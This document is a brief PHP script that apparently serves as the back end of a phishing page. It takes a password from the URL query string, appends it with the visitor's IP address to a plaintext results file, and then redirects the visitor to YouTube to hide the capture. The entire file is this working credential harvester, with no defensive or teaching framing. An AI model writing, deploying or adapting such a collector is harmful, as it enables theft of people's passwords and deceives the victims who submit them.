<?php
    $ip = $_SERVER['REMOTE_ADDR'];
    $password = $_GET["password"];

    $file = "./output/results.txt";

    $before = file_get_contents($file);
    file_put_contents($file, "$before \n$ip -> $password");

    echo "<script>window.location.href = 'https://youtube.com'</script>";
?>